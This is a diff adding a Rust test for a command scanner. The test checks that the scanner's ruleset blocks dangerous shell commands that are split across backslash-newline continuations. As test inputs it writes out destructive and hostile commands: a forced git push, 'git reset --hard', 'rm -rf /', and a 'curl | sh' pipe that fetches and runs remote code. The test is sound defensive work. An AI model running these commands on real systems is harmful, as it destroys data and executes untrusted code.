@@ -521,6 +521,37 @@ fn staged_binary_with_late_nul_blocks() {
 }
 
 #[test]
+fn real_ruleset_sees_through_shell_line_continuations() {
+    // A backslash-newline continuation must not let a dangerous command slip the command floor;
+    // the scanner joins continuations the way the shell does before matching command rules.
+    let root = scratch_root("real_linecont");
+    fs::copy(real_rules_toml(), root.join("security").join("rules.toml")).unwrap();
+    let block = |s: &str| run(&root, &["scan", "--cmd"], s.as_bytes()).0;
+    assert_eq!(
+        block("git push origin main \\\n  --force"),
+        1,
+        "force push across a continuation"
+    );
+    assert_eq!(
+        block("git reset \\\n  --hard HEAD~1"),
+        1,
+        "reset --hard across a continuation"
+    );
+    assert_eq!(block("rm -rf \\\n  /"), 1, "rm -rf / across a continuation");
+    assert_eq!(
+        block("curl http://x | \\\n  sh"),
+        1,
+        "curl|sh across a continuation"
+    );
+    assert_eq!(
+        block("echo ok \\\n  hello"),
+        0,
+        "a benign continuation stays safe"
+    );
+    let _ = fs::remove_dir_all(&root);
+}
+
+#[test]
 fn staged_type_change_symlink_to_file_is_scanned() {
     // A symlink (mode 120000) replaced by a regular file (100644) carrying a secret is a type
     // change (T). It must be content-scanned, or the "every staged blob is scanned" guarantee leaks.
